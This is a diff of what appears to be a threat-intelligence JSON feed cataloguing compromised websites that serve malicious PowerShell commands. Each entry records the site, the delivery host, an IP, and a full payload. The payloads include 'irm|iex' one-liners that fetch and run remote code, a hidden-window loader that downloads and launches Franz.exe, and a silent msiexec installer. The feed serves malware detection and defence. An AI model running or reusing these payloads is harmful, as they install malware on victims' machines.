@@ -1,5 +1,68 @@
 [
   {
+    "UrlDomain": "riskiriswandi.com",
+    "DeliveryUrl": [
+      "browse-login.info"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "91.108.98.133"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-login.info/66a3105c05a5b069",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "irm 'browse-login[.]info/66a3105c05a5b069'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-login.info/66a3105c05a5b069"
+    ],
+    "ReportId": "cmwx071yw0c8v0omlp9z99b26",
+    "ScannedAt": "2026-11-26T03:39:17.631000+00:00"
+  },
+  {
+    "UrlDomain": "sileajans.com.tr",
+    "DeliveryUrl": [
+      "friendsoftorreabbey.com"
+    ],
+    "PayloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "IP": [
+      "188.114.96.0"
+    ],
+    "Related": [],
+    "Payload": "$url = \"https://friendsoftorreabbey[.]com/32b\";\n$filename = \"Franz.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"G4spHKbT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "ReportId": "cmwwzyajr0bxx0omlfwd0algn",
+    "ScannedAt": "2026-11-26T03:32:28.831000+00:00"
+  },
+  {
+    "UrlDomain": "salihlievdenevenakliye.com.tr",
+    "DeliveryUrl": [],
+    "PayloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "IP": [
+      "104.21.69.207"
+    ],
+    "Related": [
+      {
+        "Value": "friendsoftorreabbey.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "$url = \"https://friendsoftorreabbey[.]com/32b\";\n$filename = \"Franz.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"G4spHKbT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "ReportId": "cmwwzxhdm0bx10omlwpl054pt",
+    "ScannedAt": "2026-11-26T03:31:51.050000+00:00"
+  },
+  {
     "UrlDomain": "rowantreetheatrecompany.co.uk",
     "DeliveryUrl": [
       "j7tracker.gb.net"
@@ -18513,63 +18576,5 @@
     ],
     "ReportId": "cmwd2owqi0fsp0oml01op4h6a",
     "ScannedAt": "2026-11-12T04:53:46.338000+00:00"
-  },
-  {
-    "UrlDomain": "bowenschools.co.za",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "154.0.171.171"
-    ],
-    "Related": [
-      {
-        "Value": "gitlab.com",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "IRM gitlab[.]com/amber-ffa-f15a6b/408a-b9d3-72909d12f8e6/-/raw/main/5b8-f0f1d6cc1e65 | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/amber-ffa-f15a6b/408a-b9d3-72909d12f8e6/-/raw/main/5b8-f0f1d6cc1e65"
-    ],
-    "ReportId": "cmwd0kzla0flu0omlmolvqknu",
-    "ScannedAt": "2026-11-12T03:54:44.185000+00:00"
-  },
-  {
-    "UrlDomain": "negativefeedback.co.uk",
-    "DeliveryUrl": [
-      "softsyncizobrazie.net"
-    ],
-    "PayloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "IP": [
-      "77.72.2.97"
-    ],
-    "Related": [],
-    "Payload": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"http://softsyncizobrazie[.]net/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
-    "ResolvedDownloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "ReportId": "cmwczsyh00fjs0omlcpl08ms7",
-    "ScannedAt": "2026-11-12T03:32:56.379000+00:00"
-  },
-  {
-    "UrlDomain": "islamabadhospital.com",
-    "DeliveryUrl": [
-      "softsyncizobrazie.net"
-    ],
-    "PayloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "IP": [
-      "217.21.88.84"
-    ],
-    "Related": [],
-    "Payload": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"http://softsyncizobrazie[.]net/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
-    "ResolvedDownloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "ReportId": "cmwczsy7h0fjp0omltp7h00pn",
-    "ScannedAt": "2026-11-12T03:32:54.965000+00:00"
   }
 ]
